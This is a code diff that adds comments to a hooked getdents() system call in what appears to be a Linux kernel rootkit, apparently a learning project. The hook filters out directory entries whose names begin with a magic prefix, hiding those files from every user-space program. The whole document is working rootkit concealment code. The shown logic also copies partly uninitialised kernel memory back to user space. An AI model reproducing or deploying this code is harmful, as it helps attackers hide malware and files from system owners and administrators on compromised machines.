@@ -315,60 +315,106 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
   int (*orig_func)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
   t_syscall_hook *getdents_hook;
   int nread = 0;
+
+  //bpos is the position in the "return" of getdents()
+  //i is an index into k_buf1
+  //j is an index into k_buf2
   unsigned int bpos = 0, i = 0, j = 0;
+  
   struct linux_dirent *d = NULL;
+  
+  //A boolean to indicate if the current dir-entry does (1) or does not (0)
+  //start with magix_prefix
   char starts_with_prefix = 0;
+
+  //The number of bytes we are hiding from the user space program
   unsigned int num_bytes_hidden = 0;
+
+  //I solved this using two buffers (making a trade-off in favour of efficiency
+  //rather than memory usage).
+  //
+  //Both buffers are of type char* so that the pointer arithmetic works
+  //(size I am using byte offsets).
+  //
+  //k_buf1 is used to store a copy of dirp after regular getdents() has been
+  //run.
+  //
+  //k_buf2 is used to store what I want to "return" back to the user space
+  //program, which will include the edits I made. Only the parts of k_buf1
+  //that I want the user space program to see are copied into k_buf2.
   char *k_buf1 = NULL;
   char *k_buf2 = NULL;
 
+  //Log that this hook was invoked, and which program invoked this hook
   printk(KERN_INFO "getdents() hook invoked for %s.\n", current->comm);
 
+  //Retrieve the regular getdents() function pointer
   getdents_hook = find_syscall_hook(__NR_getdents);
   orig_func = (void*) getdents_hook->orig_func;
 
+  //Execute regular getdents() function
   nread = orig_func(fd, dirp, count);
 
+  //If there was an error we have nothing to process
   if (dirp == NULL || nread < 1) {
     return nread;
   }
 
+  //Allocate k_buf1
   k_buf1 = kmalloc(count, GFP_KERNEL);
   if (k_buf1 == NULL) {
     return nread;
   }
 
+  //Allocate k_buf2
   k_buf2 = kmalloc(count, GFP_KERNEL);
   if (k_buf2 == NULL) {
     kfree(k_buf1);
     return nread;
   }
 
-  // Copy user space buffer to kernel land buffer
+  //Copy user space buffer to kernel land buffer
   copy_from_user(k_buf1, dirp, count);
 
   for (bpos = 0; bpos < (unsigned int)nread;) {
+    //Do pointer arithmetic to get the current linux_dirent for this
+    //iteration
     d = (struct linux_dirent *) (k_buf1 + bpos);
+    
+    //Check if this dir-entry's name starts with magic_prefix
     starts_with_prefix = starts_with(magic_prefix, d->d_name);
 
+    //Log the entry's name
+    //If the entry will be hidden, append " (hidden)" to the log message
     printk(KERN_INFO "entry: %s%s\n", d->d_name,
            starts_with_prefix ? " (hidden)" : "");
 
     if (!starts_with_prefix) {
+      //We do not want to hide this dir-entry.
+      //Copy the contents of this dir-entry record from k_buf1 into
+      //k_buf2.
       for (i = bpos; i < bpos + d->d_reclen; ++i) {
         k_buf2[j++] = k_buf1[i];
       }
     } else {
+      //We want to hide this dir-entry.
+      //Add the size of this record in bytes to the number of bytes
+      //we are hiding from user space.
       num_bytes_hidden += d->d_reclen;
     }
 
+    //Increment bpos by the record length, so we will be at the start
+    //of the next struct linux_dirent for the next iteration 
     bpos += d->d_reclen;
   }
 
-  // Copy kernel land buffer to user space buffer
+  //Copy kernel land buffer to user space buffer,
+  //and then free k_buf1 and k_buf2
   copy_to_user(dirp, k_buf2, count);
   kfree(k_buf1);
   kfree(k_buf2);
 
+  //So that the number of bytes read matches our edits, subtract
+  //the number of bytes hidden from user space, and return that value
   return nread - num_bytes_hidden;
 }
